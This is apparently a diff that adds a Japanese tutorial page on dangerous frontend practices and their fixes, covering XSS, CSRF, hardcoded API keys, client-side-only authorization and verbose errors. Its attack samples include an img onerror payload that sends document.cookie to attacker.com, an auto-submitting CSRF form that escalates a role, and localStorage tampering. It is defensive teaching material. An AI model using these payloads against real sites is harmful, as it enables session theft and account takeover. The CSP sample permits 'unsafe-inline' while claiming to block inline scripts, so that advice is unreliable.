@@ -1,0 +1,643 @@
+---
+title: "フロントエンドの危険な行為と対策"
+label: "フロントエンドの危険な行為と対策"
+---
+
+## フロントエンドの危険な行為と対策
+
+フロントエンドのセキュリティは、ユーザーのブラウザで実行されるため、特に注意が必要です。危険な行為を理解し、適切な対策を実施することが重要です。
+
+### なぜフロントエンドのセキュリティが重要なのか
+
+フロントエンドは、ユーザーのブラウザで実行されるため、以下のような特徴があります：
+
+- **公開性**: ソースコードが公開される
+- **改ざんの容易さ**: ユーザーがコードを改ざんできる
+- **クライアント側の制御**: クライアント側で実行されるため、完全に制御できない
+
+これらの特徴により、フロントエンドでは特別なセキュリティ対策が必要です。
+
+### 危険な行為1: XSS（Cross-Site Scripting）
+
+#### なぜXSSが危険なのか
+
+XSSは、悪意のあるスクリプトをWebページに注入する攻撃です。XSSが成功すると、以下のような問題が発生します：
+
+- **セッションハイジャック**: ユーザーのセッション情報を盗む
+- **個人情報の漏洩**: ユーザーの個人情報を取得する
+- **不正な操作**: ユーザーに代わって不正な操作を実行する
+
+#### 危険な実装例
+
+**問題のある実装:**
+
+```typescript
+// 危険な実装: ユーザー入力をそのまま表示
+function UserComment({ comment }: { comment: string }) {
+  return (
+    <div dangerouslySetInnerHTML={{ __html: comment }} />
+  );
+}
+
+// 攻撃例:
+// ユーザーが以下のコメントを入力:
+// <script>alert(document.cookie)</script>
+// → セッション情報が表示される
+```
+
+**なぜ危険なのか:**
+
+- `dangerouslySetInnerHTML`を使用すると、HTMLタグがそのまま実行される
+- 悪意のあるスクリプトが実行され、セッション情報が漏洩する可能性がある
+- ユーザーのブラウザで任意のコードが実行される
+
+**実際の攻撃例:**
+
+```javascript
+// 攻撃者が以下のコメントを投稿:
+<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)" />
+
+// このコメントが表示されると:
+// 1. 画像の読み込みに失敗
+// 2. onerrorイベントが発火
+// 3. セッション情報が攻撃者のサーバーに送信される
+```
+
+#### 安全な実装例
+
+**対策1: Reactの自動エスケープを活用**
+
+```typescript
+// 安全な実装: Reactが自動的にエスケープ
+function UserComment({ comment }: { comment: string }) {
+  // Reactはデフォルトで自動的にエスケープするため、安全
+  return <div>{comment}</div>;
+}
+
+// ユーザーが以下のコメントを入力しても:
+// <script>alert('XSS')</script>
+// → 文字列として表示され、スクリプトは実行されない
+```
+
+**対策2: DOMPurifyでサニタイズ**
+
+```typescript
+// リッチテキストエディタなど、HTMLを表示する必要がある場合
+import DOMPurify from 'dompurify';
+
+function RichTextComment({ comment }: { comment: string }) {
+  // DOMPurifyでサニタイズしてから表示
+  const sanitizedComment = DOMPurify.sanitize(comment, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+    ALLOWED_ATTR: ['href'],
+  });
+  
+  return (
+    <div dangerouslySetInnerHTML={{ __html: sanitizedComment }} />
+  );
+}
+
+// メリット:
+// - 危険なスクリプトタグが除去される
+// - 許可されたタグのみが表示される
+// - セキュリティが確保される
+```
+
+**対策3: Content Security Policy（CSP）の設定**
+
+```html
+<!-- HTMLのmetaタグでCSPを設定 -->
+<meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; 
+               script-src 'self' 'unsafe-inline'; 
+               style-src 'self' 'unsafe-inline';">
+
+<!-- または、HTTPヘッダーで設定 -->
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+**CSPの効果:**
+- インラインスクリプトの実行を防ぐ
+- 外部スクリプトの読み込みを制限
+- XSS攻撃を効果的に防ぐ
+
+### 危険な行為2: CSRF（Cross-Site Request Forgery）
+
+#### なぜCSRFが危険なのか
+
+CSRFは、ユーザーが意図しないリクエストを送信させる攻撃です。CSRFが成功すると、以下のような問題が発生します：
+
+- **不正な操作**: ユーザーに代わって不正な操作が実行される
+- **データの改ざん**: ユーザーのデータが改ざんされる
+- **サービスの悪用**: サービスが悪用される
+
+#### 危険な実装例
+
+**問題のある実装:**
+
+```typescript
+// 危険な実装: CSRF対策がない
+async function updateUserProfile(userId: string, data: UserData) {
+  const response = await fetch(`/api/users/${userId}`, {
+    method: 'PUT',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  });
+  return response.json();
+}
+
+// 攻撃例:
+// 攻撃者が以下のHTMLを用意:
+// <img src="https://example.com/api/users/1" />
+// ユーザーがこのページを訪問すると、自動的にリクエストが送信される
+```
+
+**なぜ危険なのか:**
+
+- CSRFトークンがないため、攻撃者がユーザーに代わってリクエストを送信できる
+- ユーザーがログインしている状態で、悪意のあるサイトを訪問すると、自動的にリクエストが送信される
+- ユーザーのデータが改ざんされる可能性がある
+
+**実際の攻撃例:**
+
+```html
+<!-- 攻撃者が用意した悪意のあるHTML -->
+<form action="https://example.com/api/users/1" method="POST">
+  <input type="hidden" name="email" value="attacker@example.com">
+  <input type="hidden" name="role" value="admin">
+</form>
+<script>
+  document.forms[0].submit();  // 自動的に送信
+</script>
+
+<!-- ユーザーがこのページを訪問すると: -->
+<!-- 1. ユーザーがログインしている場合、自動的にリクエストが送信される -->
+<!-- 2. ユーザーのメールアドレスが攻撃者のメールアドレスに変更される -->
+<!-- 3. ユーザーのロールが管理者に変更される -->
+```
+
+#### 安全な実装例
+
+**対策1: CSRFトークンの実装**
+
+```typescript
+// 安全な実装: CSRFトークンを使用
+async function updateUserProfile(userId: string, data: UserData) {
+  // HTMLのmetaタグからCSRFトークンを取得
+  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
+  
+  const response = await fetch(`/api/users/${userId}`, {
+    method: 'PUT',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRF-Token': csrfToken,  // CSRFトークンをヘッダーに追加
+    },
+    body: JSON.stringify(data),
+  });
+  return response.json();
+}
+
+// サーバー側でCSRFトークンを検証:
+// 1. セッションに保存されたCSRFトークンと比較
+// 2. 一致しない場合、リクエストを拒否
+// 3. これにより、攻撃者がリクエストを送信できなくなる
+```
+
+**対策2: SameSite Cookieの設定**
+
+```typescript
+// サーバー側でSameSite Cookieを設定
+// Express.jsの例
+app.use(session({
+  cookie: {
+    sameSite: 'strict',  // または 'lax'
+    secure: true,  // HTTPSのみで送信
+    httpOnly: true,  // JavaScriptからアクセス不可
+  },
+}));
+
+// 効果:
+// - クロスサイトリクエストでCookieが送信されなくなる
+// - CSRF攻撃を効果的に防ぐ
+```
+
+**対策3: カスタムヘッダーの使用**
+
+```typescript
+// カスタムヘッダーを使用してCSRFを防ぐ
+async function updateUserProfile(userId: string, data: UserData) {
+  const response = await fetch(`/api/users/${userId}`, {
+    method: 'PUT',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-Requested-With': 'XMLHttpRequest',  // カスタムヘッダー
+    },
+    body: JSON.stringify(data),
+  });
+  return response.json();
+}
+
+// サーバー側でカスタムヘッダーを検証:
+// 1. X-Requested-Withヘッダーが存在するか確認
+// 2. 存在しない場合、リクエストを拒否
+// 3. これにより、ブラウザからのリクエストのみを許可
+```
+
+### 危険な行為3: 機密情報の露出
+
+#### なぜ機密情報の露出が危険なのか
+
+フロントエンドのコードは公開されるため、機密情報を含めると以下のような問題が発生します：
+
+- **APIキーの漏洩**: APIキーが漏洩し、サービスが悪用される
+- **認証情報の漏洩**: 認証情報が漏洩し、不正アクセスが発生する
+- **ビジネスロジックの漏洩**: ビジネスロジックが漏洩し、競合他社に情報が渡る
+
+#### 危険な実装例
+
+**問題のある実装:**
+
+```typescript
+// 危険な実装: APIキーをハードコード
+const API_KEY = 'sk_live_1234567890abcdef';  // 本番環境のAPIキー
+
+async function processPayment(amount: number) {
+  const response = await fetch('https://payment-api.com/charge', {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${API_KEY}`,  // APIキーが漏洩
+    },
+    body: JSON.stringify({ amount }),
+  });
+  return response.json();
+}
+
+// 問題点:
+// - APIキーがソースコードに含まれている
+// - ソースコードは公開されるため、誰でもAPIキーを取得できる
+// - APIキーが漏洩すると、サービスが悪用される
+```
+
+**なぜ危険なのか:**
+
+- フロントエンドのコードは公開されるため、APIキーが誰でも見られる
+- APIキーが漏洩すると、攻撃者がサービスを悪用できる
+- 本番環境のAPIキーが漏洩すると、実際の決済が行われる可能性がある
+
+**実際の攻撃例:**
+
+```javascript
+// 攻撃者が以下の手順で攻撃:
+// 1. ブラウザの開発者ツールでソースコードを確認
+// 2. APIキーを発見
+// 3. APIキーを使用して、不正な決済を実行
+
+// 攻撃コード:
+const stolenApiKey = 'sk_live_1234567890abcdef';  // 漏洩したAPIキー
+fetch('https://payment-api.com/charge', {
+  method: 'POST',
+  headers: {
+    'Authorization': `Bearer ${stolenApiKey}`,
+  },
+  body: JSON.stringify({ amount: 1000000 }),  // 100万円の決済
+});
+```
+
+#### 安全な実装例
+
+**対策1: 環境変数の使用（ただし、フロントエンドでは注意が必要）**
+
+```typescript
+// Next.jsの場合: 環境変数はクライアント側でも公開される
+// 注意: NEXT_PUBLIC_で始まる環境変数はクライアント側でも公開される
+const API_URL = process.env.NEXT_PUBLIC_API_URL;  // これは公開される
+
+// 安全な方法: サーバー側でAPIキーを管理
+// フロントエンドからは、サーバー側のAPIを呼び出す
+async function processPayment(amount: number) {
+  // フロントエンドからは、自分のサーバーのAPIを呼び出す
+  const response = await fetch('/api/payment/process', {
+    method: 'POST',
+    body: JSON.stringify({ amount }),
+  });
+  return response.json();
+}
+
+// サーバー側（API Routes）でAPIキーを使用:
+// pages/api/payment/process.ts
+export default async function handler(req: Request, res: Response) {
+  const API_KEY = process.env.PAYMENT_API_KEY;  // サーバー側の環境変数（公開されない）
+  
+  const response = await fetch('https://payment-api.com/charge', {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${API_KEY}`,
+    },
+    body: JSON.stringify(req.body),
+  });
+  
+  return res.json(await response.json());
+}
+```
+
+**対策2: プロキシサーバーの使用**
+
+```typescript
+// フロントエンドからは、プロキシサーバーを経由してAPIを呼び出す
+async function processPayment(amount: number) {
+  // 自分のサーバーを経由してAPIを呼び出す
+  const response = await fetch('/api/proxy/payment', {
+    method: 'POST',
+    body: JSON.stringify({ amount }),
+  });
+  return response.json();
+}
+
+// プロキシサーバーでAPIキーを管理:
+// - APIキーはサーバー側でのみ管理
+// - フロントエンドからはAPIキーにアクセスできない
+// - セキュリティが確保される
+```
+
+### 危険な行為4: 不適切な認証・認可
+
+#### なぜ不適切な認証・認可が危険なのか
+
+認証・認可が不適切だと、以下のような問題が発生します：
+
+- **不正アクセス**: 認証されていないユーザーがアクセスできる
+- **権限の誤用**: 権限のないユーザーが操作を実行できる
+- **セッションのハイジャック**: セッション情報が盗まれ、不正アクセスが発生する
+
+#### 危険な実装例
+
+**問題のある実装:**
+
+```typescript
+// 危険な実装: クライアント側でのみ認証チェック
+function AdminPanel() {
+  const [isAdmin, setIsAdmin] = useState(false);
+  
+  useEffect(() => {
+    // クライアント側で認証チェック
+    const user = JSON.parse(localStorage.getItem('user') || '{}');
+    setIsAdmin(user.role === 'admin');
+  }, []);
+  
+  if (!isAdmin) {
+    return <div>Access Denied</div>;
+  }
+  
+  return <div>Admin Panel</div>;
+}
+
+// 問題点:
+// - クライアント側でのみ認証チェックを行っている
+// - ユーザーがlocalStorageを改ざんすると、認証をバイパスできる
+// - サーバー側での認証チェックがない
+```
+
+**なぜ危険なのか:**
+
+- クライアント側の認証チェックは、ユーザーが改ざんできる
+- localStorageを改ざんすると、認証をバイパスできる
+- サーバー側での認証チェックがないため、APIに直接アクセスできる
+
+**実際の攻撃例:**
+
+```javascript
+// 攻撃者が以下の手順で攻撃:
+// 1. ブラウザの開発者ツールでlocalStorageを確認
+// 2. localStorageのuserオブジェクトを改ざん
+// 3. roleを'admin'に変更
+
+// 攻撃コード:
+localStorage.setItem('user', JSON.stringify({
+  id: 1,
+  name: 'Attacker',
+  role: 'admin'  // 管理者に変更
+}));
+
+// これにより、管理者パネルにアクセスできる
+```
+
+#### 安全な実装例
+
+**対策1: サーバー側での認証チェック**
+
+```typescript
+// 安全な実装: サーバー側で認証チェック
+function AdminPanel() {
+  const [isAdmin, setIsAdmin] = useState(false);
+  const [loading, setLoading] = useState(true);
+  
+  useEffect(() => {
+    // サーバー側で認証チェック
+    fetch('/api/auth/check-admin')
+      .then(res => res.json())
+      .then(data => {
+        setIsAdmin(data.isAdmin);
+        setLoading(false);
+      });
+  }, []);
+  
+  if (loading) {
+    return <div>Loading...</div>;
+  }
+  
+  if (!isAdmin) {
+    return <div>Access Denied</div>;
+  }
+  
+  return <div>Admin Panel</div>;
+}
+
+// サーバー側で認証チェック:
+// pages/api/auth/check-admin.ts
+export default async function handler(req: Request, res: Response) {
+  // セッションからユーザー情報を取得
+  const user = await getSessionUser(req);
+  
+  if (!user || user.role !== 'admin') {
+    return res.json({ isAdmin: false });
+  }
+  
+  return res.json({ isAdmin: true });
+}
+```
+
+**対策2: JWTトークンの適切な管理**
+
+```typescript
+// 安全な実装: JWTトークンを適切に管理
+// 1. トークンをhttpOnly Cookieに保存（JavaScriptからアクセス不可）
+// 2. サーバー側でトークンを検証
+// 3. トークンの有効期限を短く設定
+
+// ログイン処理
+async function login(email: string, password: string) {
+  const response = await fetch('/api/auth/login', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ email, password }),
+    credentials: 'include',  // Cookieを送信
+  });
+  
+  // トークンはhttpOnly Cookieに保存されるため、JavaScriptからアクセスできない
+  return response.json();
+}
+
+// APIリクエスト時にトークンを自動的に送信
+async function fetchUserData() {
+  const response = await fetch('/api/users/me', {
+    credentials: 'include',  // Cookieを自動的に送信
+  });
+  return response.json();
+}
+```
+
+### 危険な行為5: 不適切なエラーハンドリング
+
+#### なぜ不適切なエラーハンドリングが危険なのか
+
+エラーハンドリングが不適切だと、以下のような問題が発生します：
+
+- **情報漏洩**: エラーメッセージに機密情報が含まれる
+- **システム情報の漏洩**: エラーメッセージにシステムの内部情報が含まれる
+- **攻撃の手がかり**: エラーメッセージが攻撃の手がかりになる
+
+#### 危険な実装例
+
+**問題のある実装:**
+
+```typescript
+// 危険な実装: 詳細なエラーメッセージを表示
+async function login(email: string, password: string) {
+  try {
+    const response = await fetch('/api/auth/login', {
+      method: 'POST',
+      body: JSON.stringify({ email, password }),
+    });
+    
+    if (!response.ok) {
+      const error = await response.json();
+      // 詳細なエラーメッセージを表示
+      alert(`Error: ${error.message}\nStack: ${error.stack}\nSQL: ${error.sql}`);
+    }
+  } catch (error) {
+    // エラーの詳細を表示
+    console.error('Login error:', error);
+    alert(`Error: ${error.message}`);
+  }
+}
+
+// 問題点:
+// - エラーメッセージにスタックトレースが含まれる
+// - SQLエラーが表示される
+// - システムの内部情報が漏洩する
+```
+
+**なぜ危険なのか:**
+
+- エラーメッセージにスタックトレースが含まれると、システムの構造が分かる
+- SQLエラーが表示されると、データベースの構造が分かる
+- システムの内部情報が漏洩すると、攻撃の手がかりになる
+
+**実際の攻撃例:**
+
+```javascript
+// 攻撃者が以下の手順で攻撃:
+// 1. 意図的にエラーを発生させる
+// 2. エラーメッセージから情報を収集
+// 3. 収集した情報を基に攻撃を実行
+
+// エラーメッセージの例:
+// "Error: SQL syntax error near 'SELECT * FROM users WHERE id = '1' OR '1'='1'"
+// → SQLインジェクション攻撃の手がかりになる
+```
+
+#### 安全な実装例
+
+**対策1: 汎用的なエラーメッセージを表示**
+
+```typescript
+// 安全な実装: 汎用的なエラーメッセージを表示
+async function login(email: string, password: string) {
+  try {
+    const response = await fetch('/api/auth/login', {
+      method: 'POST',
+      body: JSON.stringify({ email, password }),
+    });
+    
+    if (!response.ok) {
+      // 詳細なエラー情報は表示しない
+      alert('ログインに失敗しました。メールアドレスとパスワードを確認してください。');
+      return;
+    }
+    
+    const data = await response.json();
+    // ログイン成功の処理
+  } catch (error) {
+    // エラーの詳細はログに記録するが、ユーザーには表示しない
+    console.error('Login error:', error);
+    alert('ログインに失敗しました。しばらくしてから再度お試しください。');
+  }
+}
+
+// サーバー側でもエラーメッセージを適切に処理:
+// pages/api/auth/login.ts
+export default async function handler(req: Request, res: Response) {
+  try {
+    // ログイン処理
+  } catch (error) {
+    // エラーの詳細はログに記録
+    console.error('Login error:', error);
+    
+    // ユーザーには汎用的なエラーメッセージを返す
+    return res.status(401).json({
+      error: {
+        code: 'LOGIN_FAILED',
+        message: 'メールアドレスまたはパスワードが正しくありません。',
+      },
+    });
+  }
+}
+```
+
+**対策2: エラーログの適切な管理**
+
+```typescript
+// エラーログを適切に管理
+async function handleError(error: Error, context: string) {
+  // エラーの詳細をログサービスに送信（Sentryなど）
+  errorReportingService.captureException(error, {
+    tags: {
+      context,
+    },
+    extra: {
+      // 機密情報は含めない
+      timestamp: new Date().toISOString(),
+    },
+  });
+  
+  // ユーザーには汎用的なエラーメッセージを表示
+  showErrorToUser('エラーが発生しました。しばらくしてから再度お試しください。');
+}
+```
+
+### まとめ
+
+フロントエンドの危険な行為と対策：
+
+- **XSS**: ユーザー入力を適切にエスケープまたはサニタイズ
+- **CSRF**: CSRFトークン、SameSite Cookie、カスタムヘッダーを使用
+- **機密情報の露出**: APIキーはサーバー側で管理、プロキシサーバーを使用
+- **不適切な認証・認可**: サーバー側で認証チェック、JWTトークンを適切に管理
+- **不適切なエラーハンドリング**: 汎用的なエラーメッセージを表示、エラーログを適切に管理
+
+適切なセキュリティ対策により、フロントエンドのセキュリティを確保できます。
+
